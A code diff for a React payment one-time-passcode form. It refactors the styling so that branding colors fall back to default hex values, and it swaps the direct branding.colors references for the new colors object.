@@ -30,6 +30,18 @@ const PaymentOTPForm = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
 
+  const colors = {
+    primary: branding.colors?.primary || "#CE1126",
+    secondary: branding.colors?.secondary || "#00732F",
+    accent: branding.colors?.accent || "#000000",
+    background: branding.colors?.background || "#FFFFFF",
+    surface: branding.colors?.surface || "#F5F5F5",
+    border: branding.colors?.border || "#E0E0E0",
+    text: branding.colors?.text || "#000000",
+    textLight: branding.colors?.textLight || "#666666",
+    textOnPrimary: branding.colors?.textOnPrimary || "#FFFFFF",
+  };
+
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
 
@@ -264,7 +276,7 @@ const PaymentOTPForm = () => {
         <div 
           className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`
           }}
         >
           <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
@@ -277,8 +289,8 @@ const PaymentOTPForm = () => {
       <div 
         className="rounded-lg p-3 sm:p-4 mb-6"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: `${colors.primary}10`,
+          border: `1px solid ${colors.primary}30`
         }}
       >
         <p className="text-xs sm:text-sm text-center">
@@ -304,8 +316,8 @@ const PaymentOTPForm = () => {
                 onPaste={handlePaste}
                 className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
                 style={{
-                  borderColor: digit ? branding.colors.primary : undefined,
-                  backgroundColor: digit ? `${branding.colors.primary}08` : undefined
+                  borderColor: digit ? colors.primary : undefined,
+                  backgroundColor: digit ? `${colors.primary}08` : undefined
                 }}
                 disabled={attempts >= 3}
                 autoComplete="off"
@@ -351,7 +363,7 @@ const PaymentOTPForm = () => {
           style={{
             background: attempts >= 3 
               ? '#666' 
-              : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+              : `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`
           }}
         >
           {attempts >= 3 ? (
@@ -369,7 +381,7 @@ const PaymentOTPForm = () => {
             type="button"
             variant="ghost"
             className="w-full mt-3"
-            style={{ color: branding.colors.primary }}
+            style={{ color: colors.primary }}
             onClick={() => {
               setCountdown(60);
               toast({
